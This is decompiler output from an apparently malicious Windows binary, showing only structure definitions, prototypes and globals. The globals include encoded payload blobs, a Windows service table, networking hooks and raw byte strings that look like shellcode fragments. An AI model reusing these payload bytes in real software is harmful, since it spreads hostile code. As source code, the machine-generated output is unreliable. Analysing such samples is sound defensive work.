#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <time.h>
#include <windows.h>

// ----------------- Float Types Definitions ------------------

typedef double float64_t;
typedef long double float80_t;

// ------------------------ Structures ------------------------

struct WSAData {
    int16_t e0;
    int16_t e1;
    int16_t e2;
    int16_t e3;
    char * e4;
    char e5[1];
    char e6[1];
};

struct _LARGE_INTEGER {
    int64_t e0;
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY * e0;
    struct _LIST_ENTRY * e1;
};

struct _OVERLAPPED {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    char * e3;
};

struct _RTL_CRITICAL_SECTION {
    struct _RTL_CRITICAL_SECTION_DEBUG * e0;
    int32_t e1;
    int32_t e2;
    char * e3;
    char * e4;
    int32_t e5;
};

struct _RTL_CRITICAL_SECTION_DEBUG {
    int16_t e0;
    int16_t e1;
    struct _RTL_CRITICAL_SECTION * e2;
    struct _LIST_ENTRY e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int16_t e7;
    int16_t e8;
};

struct _SERVICE_STATUS {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
};

struct _SERVICE_TABLE_ENTRYA {
    char * e0;
    void (**e1)(int32_t, char **);
};

struct _TYPEDEF_IP_ADDRESS_STRING__PIP_ADDRESS_STRING_IP_MASK_STRING__PIP_MASK_STRING {
    char e0[1];
};

struct _IP_ADDR_STRING {
    struct _IP_ADDR_STRING * e0;
    struct _TYPEDEF_IP_ADDRESS_STRING__PIP_ADDRESS_STRING_IP_MASK_STRING__PIP_MASK_STRING e1;
    struct _TYPEDEF_IP_ADDRESS_STRING__PIP_ADDRESS_STRING_IP_MASK_STRING__PIP_MASK_STRING e2;
    int32_t e3;
};

struct _IP_ADAPTER_INFO {
    struct _IP_ADAPTER_INFO * e0;
    int32_t e1;
    char e2[1];
    char e3[1];
    int32_t e4;
    char e5[1];
    int32_t e6;
    int32_t e7;
    int32_t e8;
    struct _IP_ADDR_STRING * e9;
    struct _IP_ADDR_STRING e10;
    struct _IP_ADDR_STRING e11;
    struct _IP_ADDR_STRING e12;
    bool e13;
    struct _IP_ADDR_STRING e14;
    struct _IP_ADDR_STRING e15;
    int32_t e16;
    int32_t e17;
};

struct _IP_PER_ADAPTER_INFO_W2KSP1 {
    int32_t e0;
    int32_t e1;
    struct _IP_ADDR_STRING * e2;
    struct _IP_ADDR_STRING e3;
};

struct fd_set {
    int32_t e0;
    int32_t e1[1];
};

struct in_addr {
    int32_t e0;
};

struct sockaddr {
    int16_t e0;
    char e1[14];
};

struct timeval {
    int32_t e0;
    int32_t e1;
};

// ------------------- Function Prototypes --------------------

int32_t entry_point(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
void function_401000(void);
void function_401010(void);
void function_401030(void);
int32_t function_401040(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_401140(char * str2, char * str, int32_t a3);
int32_t function_401190(char * a1, int32_t a2, char * a3, char * a4, char * a5);
void function_401310(void);
int32_t function_401370(int32_t a1, int32_t a2, int32_t a3, float64_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, int32_t a10, int32_t a11, int32_t a12, int32_t a13, int32_t a14, int32_t a15, float64_t a16, int32_t a17, int32_t addr, int32_t a19, int32_t a20, int32_t a21, char * a22, int32_t a23, int32_t buf2, int32_t a25, int32_t a26, int32_t a27, int32_t a28);
int64_t function_401660(int64_t a1, int32_t a2, int32_t a3);
int32_t function_4017b0(char * a1, char * a2);
int32_t function_401980(struct sockaddr * cp, int32_t host_short);
int32_t function_401b70(char * cp, int32_t a2, int32_t host_short);
int32_t function_401d80(void);
int32_t function_406eb0(int32_t a1);
int32_t function_406ed0(int32_t a1);
int32_t function_406f00(int32_t a1, int32_t a2, uint32_t a3, int32_t a4);
int32_t function_406f50(int32_t a1, int32_t a2, char * a3, char * a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, int32_t a10, int32_t a11, int32_t a12, int32_t a13, int32_t a14, int32_t a15, int32_t a16, int32_t a17, int32_t a18, int32_t a19, int32_t a20, int32_t a21, int32_t a22, int32_t a23, int32_t a24, int32_t a25, int32_t a26, int32_t a27, int32_t a28, int32_t a29);
int32_t function_4072a0(char * cp, int32_t a2, int32_t host_short);
int32_t function_407480(int32_t a1);
int32_t function_407540(char * a1, int32_t a2, int32_t a3);
int32_t function_407620(void);
int32_t function_407660(void);
int32_t function_4076b0(char * a1);
int32_t function_407720(int32_t a1);
int32_t function_407840(char * str2, char * format, int32_t (**a3)(char *), char * a4, int32_t a5);
char * function_407a20(void);
int32_t function_407b90(void);
int32_t function_407bd0(int32_t a1);
int32_t function_407c40(void);
char * function_407ce0(void);
int32_t function_407f20(void);
int32_t function_407f30(int32_t a1);
int32_t function_407f89(int32_t a1, int32_t lpInfo, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, char * hService, int32_t a9, int32_t a10, int32_t a11);
char * function_408000(void);
int32_t function_408090(int32_t a1, int32_t a2);
int32_t function_408140(void);
int32_t function_4081d0(void);
void function_408200(char * a1, char * a2, int32_t a3);
int32_t function_4082b0(int32_t * a1, int32_t a2);
int32_t function_4082c0(int32_t * a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_408390(int32_t * a1, int32_t * a2, int32_t a3);
int32_t function_4085d0(int32_t * a1, int32_t * a2, int32_t a3);
int32_t function_4089d0(int32_t * a1, int32_t a2);
int32_t function_408a10(int32_t a1);
int32_t function_408a60(int32_t * a1, int32_t a2, int32_t * a3, int32_t * a4, int32_t a5, int32_t a6);
int32_t function_408cd0(int32_t a1, int32_t a2);
int32_t function_408d30(int32_t * a1);
int32_t function_408d50(int32_t * a1, int32_t a2);
int32_t function_408db0(int32_t result, int32_t a2, int32_t a3);
int32_t function_408dd0(int32_t a1);
int32_t function_408e30(int32_t * a1, int32_t * a2);
int32_t function_408e50(int32_t a1, int32_t host_long, int32_t host_long2, int32_t a4);
void function_409040(void);
int32_t function_409050(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4);
int32_t function_409080(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4);
int32_t function_4090b0(int32_t * a1, int32_t * a2);
int32_t function_4090d0(int32_t host_long, int32_t host_long2, int32_t host_long3);
int32_t function_409110(int32_t host_long);
int32_t function_409160(char * cp, struct _IP_PER_ADAPTER_INFO_W2KSP1 * a2);
int32_t function_409470(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4);
int32_t function_409680(int32_t * a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_409750(int32_t * a1, int32_t a2, int32_t a3);
void function_4097b0(void);
int32_t function_4097fe(char * a1);
void function_40980a(void);
int32_t (**function_409816(int32_t (**a1)(), int32_t a2))();
void function_409842(int32_t a1);
int32_t function_409860(int32_t a1);
void function_409890(void);
void function_409952(void);
void function_409a0a(void);
int32_t function_409b54(int32_t a1, int32_t a2, int32_t a3);
int32_t function_409b68(int32_t status);
void function_409b74(void);
int32_t function_409b8c(void);
int32_t function_409b9e(void);
int32_t function_409ba1(void);
int32_t function_409ba2(int32_t * a1);
int32_t unknown_407fa0(int32_t a1, int32_t a2);
int32_t unknown_40a100(void);
int32_t unknown_40a108(void);
int32_t unknown_40a120(void);
int32_t unknown_40a144(void);
int32_t unknown_40a180(void);

// --------------------- Global Variables ---------------------

int32_t g1 = 0; // eax
int32_t g2 = 0; // ebp
int32_t g3 = 0; // ebx
int32_t g4 = 0; // ecx
int32_t g5 = 0; // edi
int32_t g6 = 0; // edx
int32_t g7 = 0; // esi
int32_t g8 = 0; // esp
int32_t g9 = 0x5b5d5e5f; // 0x401650
int32_t g10 = -0x72e73b7d; // 0x407989
int32_t g11 = -0x3b7c0f75; // 0x4079b9
int32_t g12 = 0x1023d; // 0x4079ce
int32_t g13 = 0x7815ff56; // 0x4079de
int32_t g14 = 0x15ff326a; // 0x4079e5
int32_t g15 = -0x7eb9; // 0x4079ed
int32_t g16 = 443; // 0x407a0c
int32_t g17 = -0x17afffdc; // 0x409281
int32_t g18 = -0x97a0f75; // 0x4092ca
int32_t g19 = -0x17afffdc; // 0x40933e
int32_t g20 = 0x1424748b; // 0x409365
int32_t g21 = -0x5effda01; // 0x409b74
int32_t g24 = 0x448908c6; // 0x410800
char * g25; // 0x41b924
char * g26; // 0x41b9b0
char * g27; // 0x41ba3c
char * g28; // 0x41bab0
int16_t * g29 = (int16_t *)0x35100000; // 0x41bb4c
char * g30; // 0x41bbb0
int16_t * g31 = (int16_t *)0x35100000; // 0x41c3b8
int16_t * g32 = (int16_t *)0x35100000; // 0x41e484
int16_t * g33 = (int16_t *)0x35100000; // 0x41f4ec
int16_t * g34 = (int16_t *)0x35100000; // 0x420554
char g35[819] = "MK9f8lBAf/FKP5U2etKvFr+y0UzeQ50K1VhCDWxQIyPi78hG4ytDPs/1abcyyE+Zz82FmWbwA6SnUjO/25jXVospykFgiPFrDMiCFBF0uut8WqNe7+7HmU8v+Ig4F+1eQ9MSR7WXiFiZXWHXj1crLYpGpFd95oYovDOvw+yWgkxqIT+R6V2F+o5RYMdg9YCMTgtiyu70wCgucw9RU1kqGkiYCOkKL0aWDOzuBO5S5CkTYAJdzE+W5XDCgX6cpWGhJ0FasNnH3NAfjYI0LszwpEDu98OBY+zmtTlZtC3oPFMWAC/Z0AlaKppAPj9wC+wTUvHaYebKOjTujZqL+ysbIsiANOz9as1cnBUVVGzas9ZZKOX83TZfRF3UTrZM1UxnxEDg+3tUKdUvZGixYunoOnldp/9oFIHacUCtHo6CGE6jgS0iRgbi3YfFyvD/+d8KjQ+vZREmGxZ+/yKtIKXOsz9+pMo0OiDcvtF3PlEUS6xy7ekKLyUOWAWFoR9s+H2bIXCRIo/Jdns9MdGkdz8+tco7bthLrJghq4A46rewPPAV1vte6FLbSLJonwdvJda4x4RldJLN4mRCT4nZ3t7O8oI/ePQxRdVXrtGJ0OQ5HlQrbdkvR6R7+hr8VdXdUcfdnHbb1BfzJiGI/e6+DyAxsdl29vVlXV0cVx6dNEAIkOVnLPajGppXEoiUc7sGlzOdU52RJCjgIVLG5Q/eKkNO9LTendYxljGopQHZ2SJXus2AQl97m0T6kswRtRBzqKS1cRYKce1MXGWmjsiMIrLz8NerBzf2NnrmQSBxUTIuUPqxoxBajr"; // 0x420800
int16_t * g36 = (int16_t *)0x35100000; // 0x4215bc
int16_t * g37 = (int16_t *)0x35100000; // 0x422624
int16_t * g38 = (int16_t *)0x35100000; // 0x42368c
int16_t * g39 = (int16_t *)0x35100000; // 0x4246f4
int16_t * g40 = (int16_t *)0x35100000; // 0x42575c
int16_t * g41 = (int16_t *)0x35100000; // 0x4267c4
int16_t * g42 = (int16_t *)0x35100000; // 0x42782c
int16_t * g43 = (int16_t *)0x35100000; // 0x428894
int16_t * g44 = (int16_t *)0x35100000; // 0x4298fc
int16_t * g45 = (int16_t *)0x31000000; // 0x42a964
char * g46; // 0x42a9c4
char * g47; // 0x42aa50
char * g48; // 0x42aa94
char * g49; // 0x42ab20
int16_t * g50 = (int16_t *)0x31000000; // 0x42ab78
int16_t * g51 = (int16_t *)0x35100000; // 0x42abd8
char * g52 = "\x32\x42\x67\x48\x44\x59\x75\x39\x4d\x31\x52\x4f\x67\x31\x46\x6d\x73\x54\x6d\x37\x6a\x4a\x67\x30\x38\x69\x64\x4f\x6e\x54\x39\x37\x43\x56\x76\x4c\x76\x43\x44\x2f\x69\x47\x45\x69\x74\x2f\x6f\x39\x49\x4c\x45\x43\x46\x4c\x4a\x68\x36\x6e\x50\x48\x5a\x49\x78\x32\x51\x54\x6c\x4d\x54\x57\x6d\x54\x36\x6d\x38\x53\x43\x44\x64\x76\x6b\x43\x5a\x47\x53\x6d\x6b\x6d\x68\x79\x51\x59\x45\x4d\x77\x67\x57\x2b\x53\x78\x51\x47\x2f\x57\x4a\x78\x6b\x35\x53\x38\x37\x68\x41\x78\x5a\x38\x70\x46\x42\x6b\x64\x62\x64\x59\x62\x76\x30\x54\x75\x4d\x36\x4e\x30\x31\x78\x75\x78\x2f\x41\x38\x38\x47\x44\x57\x37\x45\x63\x2f\x30\x73\x4c\x44\x57\x4d\x34\x6a\x2b\x72\x64\x4b\x45\x63\x6f\x4b\x64\x2b\x51\x64\x56\x2f\x34\x58\x47\x78\x6b\x72\x38\x42\x6d\x30\x35\x46\x57\x77\x68\x41\x6c\x64\x73\x53\x73\x56\x6a\x6c\x36\x48\x73\x32\x46\x6c\x36\x34\x35\x56\x73\x77\x55\x57\x70\x31\x2f\x46\x34\x70\x68\x4b\x6d\x49\x63\x39\x4b\x31\x33\x58\x4f\x52\x37\x32\x62\x42\x6f\x50\x74\x66\x6d\x35\x53\x44\x45\x64\x68\x46\x5a\x41\x45\x42\x62\x45\x78\x53\x61\x77\x4c\x6d\x43\x74\x74\x4e\x41\x6e\x65\x70\x75\x41\x63\x73\x36\x4e\x58\x62\x4e\x66\x39\x4b\x4d\x51\x4e\x37\x4f\x45\x6d\x44\x2f\x34\x54\x55\x79\x35\x71\x74\x4e\x4b\x6b\x33\x38\x6f\x36\x65\x53\x79\x63\x52\x70\x4b\x6f\x6e\x2b\x56\x2f\x39\x61\x37\x5a\x30\x4d\x75\x43\x74\x41\x47\x4b\x6c\x4e\x71\x57\x61\x51\x4a\x32\x6b\x45\x2f\x44\x61\x79\x54\x30\x6a\x55\x59\x70\x5a\x6a\x4f\x72\x69\x57\x72\x42\x44\x4f\x31\x4a\x76\x50\x53\x44\x65\x54\x38\x4b\x55\x7a\x36\x39\x47\x67\x61\x65\x66\x6b\x55\x4b\x2f\x4d\x4b\x62\x71\x55\x39\x75\x7a\x51\x35\x38\x65\x2b\x50\x68\x4a\x6e\x35\x73\x79\x6f\x38\x63\x66\x6d\x76\x72\x2f\x57\x63\x57\x55\x30\x31\x78\x4b\x50\x4a\x50\x76\x37\x71\x56\x36\x33\x33\x61\x4f\x77\x34\x4b\x64\x42\x4e\x53\x4b\x68\x48\x5a\x48\x55\x33\x55\x4d\x4d\x6a\x6c\x37\x69\x47\x66\x6d\x6d\x5a\x30\x61\x62\x6f\x38\x4b\x75\x37\x63\x46\x35\x50\x6f\x31\x73\x65\x41\x37\x65\x62\x38\x32\x39\x5a\x2f\x63\x34\x51\x79\x4f\x4b\x4f\x43\x56\x65\x78\x44\x51\x66\x56\x76\x30\x52\x37\x57\x53\x66\x58\x31\x46\x41\x47\x42\x31\x61\x43\x41\x55\x2b\x75\x73\x6f\x78\x42\x56\x49\x48\x63\x64\x4f\x59\x78\x32\x43\x57\x38\x63\x57\x69\x51\x66\x2f\x4a\x73\x69\x67\x48\x30\x38\x48\x6d\x42\x6c\x34\x6e\x2b\x79\x6c\x39\x33\x77\x67\x79\x41\x6e\x4b\x42\x42\x55\x53\x55\x7a\x35\x6d\x50\x53\x54\x4d\x45\x56\x41\x32\x4c\x62\x4e\x6a\x35\x73\x37\x57\x57\x67\x56\x71\x78\x62\x64\x2f\x49\x6c\x47\x7a\x39\x56\x65\x52\x54\x4d\x65\x4a\x74\x53\x5a\x56\x42\x69\x68\x43\x6e\x45\x6a\x6d\x42\x75\x49\x70\x42\x44\x65\x2f\x6b\x50\x70\x6a\x57\x6f\x68\x4e\x75\x2f\x2b\x66\x4d\x4c\x65\x30\x6f\x37\x37\x55\x6d\x76\x50\x36\x66\x46\x6a\x35\x50\x47\x4c\x51\x56\x5a\x62\x42\x4c\x41\x54\x34\x33\x45\x35\x5a\x2f\x31\x43\x55\x45\x6e\x38\x55\x35\x4a\x4b\x44\x7a\x76\x43\x4e\x30\x45\x72\x4f\x76\x6a\x32\x4f\x4b\x4d\x61\x56\x47\x38\x44\x48\x61\x44\x4b\x76\x37\x36\x69\x45\x78\x30\x62\x55\x63\x68\x4f\x52\x46\x66\x67\x56\x56\x62\x7a\x49\x67\x4c\x6f\x70\x48\x45\x42\x72\x52\x51\x32\x6e\x66\x6e\x48\x59\x48\x4d\x45\x4d\x49\x46\x31\x6d\x59\x70\x36\x74\x38\x45\x52\x57\x4d\x38\x71\x47\x36\x47\x4e\x2b\x6c\x69\x68\x4e\x38\x75\x31\x72\x41\x37\x30\x4e\x4a\x4d\x74\x63\x47\x50\x6d\x2f\x59\x39\x4a\x55\x35\x6d\x38\x2b\x4e\x39\x68\x61\x76\x47\x70\x72\x2b\x6f\x4a\x62\x4e\x62\x4c\x48\x32\x33\x36\x39\x30\x4a\x67\x7a\x34\x38\x41\x4e\x62\x68\x69\x2f\x73\x62\x37\x6a\x4d\x52\x41\x6e\x50\x64\x47\x6a\x38\x38\x6a\x73\x6b\x67\x62\x5a\x69\x51\x55\x31\x63\x56\x37\x70\x76\x54\x77\x4e\x46\x55\x44\x4e\x4b\x44\x79\x37\x4a\x67\x6c\x4f\x77\x32\x63\x54\x65\x35\x37\x4b\x35\x6b\x72\x66\x6a\x4b\x75\x4e\x65\x2f\x47\x75\x46\x33\x50\x2b\x52\x6c\x50\x38\x50\x2b\x6e\x65\x50\x4c\x51\x6f\x70\x67\x2b\x44\x34\x51\x4a\x49\x49\x77\x38\x6b\x4b\x63\x30\x4b\x4f\x2f\x65\x6d\x56\x4a\x65\x44\x64\x58\x35\x76\x39\x4e\x53\x6e\x79\x2b\x78\x79\x61\x31\x30\x64\x31\x56\x4c\x76\x61\x71\x57\x54\x6c\x66\x62\x75\x69\x42\x73\x71\x55\x48\x4d\x33\x79\x79\x30\x6f\x53\x31\x49\x47\x46\x66\x63\x48\x73\x45\x2b\x64\x35\x50\x61\x61\x78\x52\x6d\x2f\x33\x70\x6f\x6c\x67\x75\x6f\x56\x68\x59\x2f\x69\x32\x68\x48\x73\x73\x6b\x56\x2b\x6b\x55\x41\x75\x6b\x5a\x47\x52\x71\x35\x72\x33\x41\x54\x58\x39\x61\x4a\x78\x41\x7a\x71\x2f\x54\x67\x42\x68\x69\x43\x42\x6a\x45\x55\x57\x4b\x5a\x33\x63\x45\x35\x75\x32\x50\x39\x2b\x34\x64\x52\x33\x6a\x66\x55\x32\x33\x74\x6c\x43\x7a\x2f\x74\x43\x55\x38\x68\x67\x6a\x61\x70\x43\x4f\x57\x5a\x76\x39\x66\x65\x78\x48\x49\x52\x69\x79\x6b\x36\x7a\x61\x79\x4e\x53\x48\x41\x68\x32\x69\x56\x69\x6d\x69\x45\x30\x69\x4f\x78\x53\x2f\x4f\x75\x52\x70\x62\x70\x75\x6e\x57\x65\x74\x55\x4e\x55\x69\x39\x39\x51\x64\x6e\x2f\x37\x37\x56\x67\x58\x6f\x41\x72\x6d\x6f\x4b\x44\x63\x37\x36\x54\x33\x45\x2b\x37\x5a\x68\x41\x66\x75\x44\x77\x4e\x33\x4f\x6c\x53\x4b\x39\x31\x4c\x5a\x4f\x4b\x36\x64\x49\x77\x6b\x4b\x6d\x6e\x47\x52\x4b\x33\x58\x34\x78\x56\x32\x79\x4f\x35\x61\x4b\x76\x2b\x39\x43\x56\x6e\x6f\x75\x6e\x36\x4d\x43\x34\x4f\x53\x6d\x64\x4b\x51\x72\x74\x4e\x34\x7a\x5a\x6e\x41\x53\x68\x50\x47\x61\x33\x79\x4c\x70\x71\x53\x33\x56\x76\x61\x44\x2b\x57\x35\x49\x52\x6b\x41\x39\x64\x68\x67\x4a\x69\x31\x4e\x6c\x59\x50\x44\x68\x4b\x51\x42\x32\x70\x72\x37\x47\x67\x70\x72\x62\x4c\x72\x75\x45\x38\x78\x74\x47\x6b\x71\x57\x47\x46\x74\x44\x6f\x71\x7a\x49\x58\x65\x58\x55\x33\x58\x56\x36\x4e\x4f\x73\x4b\x37\x54\x6c\x63\x48\x62\x42\x66\x35\x41\x6c\x37\x68\x51\x41\x38\x51\x43\x49\x62\x45\x35\x67\x34\x5a\x66\x77\x79\x4f\x45\x56\x55\x52\x6f\x72\x6c\x71\x42\x49\x74\x2b\x38\x49\x4c\x6f\x58\x4c\x44\x48\x64\x34\x58\x46\x38\x44\x38\x4d\x4f\x74\x44\x71\x32\x78\x47\x6d\x55\x31\x49\x41\x64\x31\x50\x67\x78\x4e\x48\x47\x2b\x39\x32\x47\x48\x38\x54\x6e\x45\x52\x59\x47\x58\x39\x56\x6e\x55\x5a\x74\x58\x73\x63\x35\x55\x59\x61\x76\x48\x2f\x6f\x66\x63\x31\x39\x35\x61\x66\x62\x36\x65\x44\x49\x79\x51\x4d\x6f\x65\x39\x54\x52\x54\x77\x74\x4d\x71\x74\x2f\x34\x68\x55\x66\x39\x57\x73\x67\x63\x68\x44\x64\x63\x6e\x75\x4d\x4f\x33\x63\x75\x54\x33\x74\x36\x57\x49\x4a\x75\x66\x37\x39\x47\x77\x52\x78\x77\x74\x79\x75\x4b\x32\x56\x42\x6b\x37\x68\x48\x75\x4d\x49\x53\x77\x33\x51\x31\x6c\x39\x31\x6d\x2b\x4a\x43\x32\x31\x71\x33\x61\x63\x4c\x79\x2b\x53\x62\x2b\x44\x58\x69\x4b\x37\x32\x31\x36\x75\x72\x59\x52\x64\x4b\x77\x36\x72\x47\x43\x2b\x5a\x39\x6b\x47\x51\x37\x7a\x61\x70\x30\x38\x38\x59\x46\x70\x70\x6e\x6c\x2b\x56\x78\x57\x70\x68\x71\x5a\x63\x6b\x2f\x57\x51\x80"; // 0x42b1b8
char * g53 = "\x47\x77\x52\x78\x77\x74\x79\x75\x4b\x32\x56\x42\x6b\x37\x68\x48\x75\x4d\x49\x53\x77\x33\x51\x31\x6c\x39\x31\x6d\x2b\x4a\x43\x32\x31\x71\x33\x61\x63\x4c\x79\x2b\x53\x62\x2b\x44\x58\x69\x4b\x37\x32\x31\x36\x75\x72\x59\x52\x64\x4b\x77\x36\x72\x47\x43\x2b\x5a\x39\x6b\x47\x51\x37\x7a\x61\x70\x30\x38\x38\x59\x46\x70\x70\x6e\x6c\x2b\x56\x78\x57\x70\x68\x71\x5a\x63\x6b\x2f\x57\x51\x80"; // 0x42b76c
char * g54; // 0x42bc40
char * g55 = "\xc3\x56\x89\xc6\x83\xc6\x3c\x8b\x36\x01\xc6\x66\x81\x3e\x50\x45\x75\x09\x83\xc6\x78\x8b\x36\x01\xf0\x5e\xc3\x31\xc0\xeb\xfa\x56\x51\x57\x89\xc6\x31\xc0\x89\xc7\xc1\xe7\x07\x29\xc7\x89\xf8\x31\xc9\x8a\x0e\x80\xf9"; // 0x42c1f4
char * g56; // 0x42c7a8
char * g57 = "\xc1\xe7\x07\x29\xc7\x89\xf8\x31\xc9\x8a\x0e\x80\xf9"; // 0x42cd84
char * g58 = "\xc1\xe7\x07\x29\xc7\x89\xf8\x31\xc9\x8a\x0e\x80\xf9"; // 0x42d310
char * g59 = "\x89\xec\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x5e\x5f\x5d\x5b\xc3\x53\x52\x51\x55\x48\x89\xe5\x48\x81\xec"; // 0x42de28
char * g60; // 0x42e2a8
char * g61; // 0x42e324
char * g62; // 0x42e378
int32_t g63 = 0x54000000; // 0x42e3d0
int32_t g64 = 0x63000000; // 0x42e42c
char * g65; // 0x42e494
int32_t g66 = 0x4d53ff47; // 0x42e497
int32_t g67 = 0x4a000000; // 0x42e4f4
int32_t g68 = 0; // 0x42e510
int32_t g69 = 0; // 0x42e511
int32_t g70 = 0; // 0x42e512
int32_t g71 = 0; // 0x42e513
int32_t g72 = 0; // 0x42e514
int32_t g73 = 0x10000000; // 0x42e515
int32_t g74 = 0x100000; // 0x42e516
int32_t g75 = 0x1000; // 0x42e517
char * g76; // 0x42e544
int32_t g77 = -0x78000000; // 0x42e5d0
int32_t g78 = 0x5c000000; // 0x42e65c
int32_t g79 = 0x400800; // 0x42e67c
char g80[3] = "\b@"; // 0x42e67d
int32_t g81 = 0x4e000000; // 0x42e6bc
int32_t g82 = -0x100f800; // 0x42e6d8
int32_t g83 = 0xfeff08; // 0x42e6d9
char g85[3] = "\bA"; // 0x42e6dd
int32_t g86 = 0xc0f0041; // 0x42e6de
int32_t g87 = 0xee3401; // 0x42e6ed
int32_t g88 = 0xee34; // 0x42e6ee
int32_t g89 = 238; // 0x42e6ef
int32_t g90 = 0xc000000; // 0x42e6f0
int16_t * g91 = (int16_t *)0x4e100000; // 0x42e710
int32_t g92 = -0x100f800; // 0x42e72c
int32_t g93 = 0xfeff08; // 0x42e72d
char g95[3] = "\bB"; // 0x42e731
int32_t g96 = 0xd000e00; // 0x42e750
int32_t g97 = 16; // 0x42e754
char * g98 = "\x8b\x44\x24\x04\x60\x89\xc5\x81\xec\xb4"; // 0x42e758
char g99[3] = "p}"; // 0x42ece9
int32_t g100 = 256; // 0x42fa58
int32_t g101 = 0; // 0x42fa5c
int32_t g102 = 0x66e08948; // 0x42fa60
int32_t g103 = 0x1df8a; // 0x4302ce
char g105[2] = "R"; // 0x43137c
struct _RTL_CRITICAL_SECTION * g106 = NULL; // 0x431418
void (**g107)(int32_t) = NULL; // 0x431430
int32_t g108 = 0; // 0x431434
int32_t g109 = 0; // 0x431438
int32_t g110 = 0; // 0x43143c
int32_t g111 = 0; // 0x431440
int32_t g112 = 0; // 0x431444
int32_t g113 = 0; // 0x431448
int32_t (*g114)(int32_t) = NULL; // 0x43144c
float64_t g115 = 0.0; // 0x431450
int32_t (*g116)(int32_t, int32_t, int32_t, int32_t, int32_t, int32_t, int32_t) = NULL; // 0x431458
char * g117; // 0x43145c
int32_t (*g118)(int32_t, int32_t) = NULL; // 0x431460
int32_t g119 = 0; // 0x431468
int32_t g120 = 0; // 0x43146c
int32_t g121 = 0; // 0x431474
int32_t (*g122)(int32_t, int32_t, int32_t, int32_t, int32_t, int32_t, int32_t, int32_t, int32_t) = NULL; // 0x431478
int16_t * g123 = NULL; // 0x431480
int32_t g124 = 0; // 0x431484
int32_t g125 = 0; // 0x433ba0
int32_t g126 = 0; // 0x433ba4
int32_t g127 = 0; // 0x433ba8
int32_t g128 = 0; // 0x433bac
int32_t g129 = 0; // 0x433bb0
char * g130; // 0x433bb4
int32_t g131 = 0; // 0x4362c8
int32_t g132 = 0; // 0x4362cc
int32_t g133 = 0; // 0x4362d0
int32_t g134 = 0; // 0x4362d4
int32_t g135 = 0; // 0x4389f0
int32_t g136 = 0; // 0x4389f4
int32_t g137 = 0; // 0x4389f8
int32_t g138 = 0; // 0x4389fc
int32_t g139 = 0; // 0x438a00
char * g140; // 0x438a04
int32_t g141 = 0; // 0x43b118
int32_t g142 = 0; // 0x43b11c
int32_t g143 = 0; // 0x43b120
int32_t g144 = 0; // 0x43b124
int32_t g145 = 0; // 0x43b128
int32_t g146 = 0; // 0x43b12c
int32_t g147 = 0; // 0x43b130
int32_t g148 = 0; // 0x43d840
int32_t g149 = 0; // 0x43d844
int32_t g150 = 0; // 0x43d848
int32_t g151 = 0; // 0x43d84c
int32_t g152 = 0; // 0x43d850
char * g153; // 0x43d854
int32_t g154 = 0; // 0x43ff68
int32_t g155 = 0; // 0x43ff6c
int32_t g156 = 0; // 0x43ff70
int32_t g157 = 0; // 0x43ff74
int32_t g158 = 0; // 0x43ff78
int32_t g159 = 0; // 0x43ff7c
int32_t g160 = 0; // 0x43ff80
int32_t g161 = 0; // 0x442690
int32_t g162 = 0; // 0x442694
int32_t g163 = 0; // 0x442698
int32_t g164 = 0; // 0x44269c
int32_t g165 = 0; // 0x4426a0
char * g166; // 0x4426a4
int32_t g167 = 0; // 0x444db8
int32_t g168 = 0; // 0x444dbc
int32_t g169 = 0; // 0x444dc0
int32_t g170 = 0; // 0x444dc4
int32_t g171 = 0; // 0x4474e0
int32_t g172 = 0; // 0x4474e4
int32_t g173 = 0; // 0x4474e8
int32_t g174 = 0; // 0x4474ec
int32_t g175 = 0; // 0x4474f0
int16_t * g176 = NULL; // 0x4474f4
int32_t g177 = 0; // 0x449c08
int32_t g178 = 0; // 0x449c0c
int32_t g179 = 0; // 0x449c10
int32_t g180 = 0; // 0x449c14
int32_t g181 = 0; // 0x449c18
char * g182; // 0x449e9c
int32_t g183 = 0; // 0x44c330
int32_t g184 = 0; // 0x44c334
int32_t g185 = 0; // 0x44c338
int32_t g186 = 0; // 0x44c33c
int32_t g187 = 0; // 0x44c340
char * g188; // 0x44c344
int32_t g189 = 0; // 0x44ea58
int32_t g190 = 0; // 0x44ea5c
int32_t g191 = 0; // 0x44ea60
int32_t g192 = 0; // 0x44ea64
int32_t g193 = 0; // 0x44ea68
int16_t * g194 = NULL; // 0x44ea6c
int32_t g195 = 0; // 0x451180
int32_t g196 = 0; // 0x451184
int32_t g197 = 0; // 0x451188
int32_t g198 = 0; // 0x45118c
int32_t g199 = 0; // 0x451190
char * g200; // 0x451194
int32_t g201 = 0; // 0x4538a8
int32_t g202 = 0; // 0x4538ac
int32_t g203 = 0; // 0x4538b0
int32_t g204 = 0; // 0x4538b4
int32_t g205 = 0; // 0x4538b8
int16_t * g206 = NULL; // 0x4538bc
int32_t g207 = 0; // 0x455fd0
int32_t g208 = 0; // 0x455fd4
int32_t g209 = 0; // 0x455fd8
int32_t g210 = 0; // 0x455fdc
int32_t g211 = 0; // 0x455fe0
char * g212; // 0x455fe4
int32_t g213 = 0; // 0x4586f8
int32_t g214 = 0; // 0x4586fc
int32_t g215 = 0; // 0x458700
int32_t g216 = 0; // 0x458704
int32_t g217 = 0; // 0x458708
char * g218; // 0x45870c
int32_t g219 = 0; // 0x45ae20
int32_t g220 = 0; // 0x45ae24
int32_t g221 = 0; // 0x45ae28
int32_t g222 = 0; // 0x45ae2c
int32_t g223 = 0; // 0x45ae30
int16_t * g224 = NULL; // 0x45ae34
int32_t g225 = 0; // 0x45d548
int32_t g226 = 0; // 0x45d54c
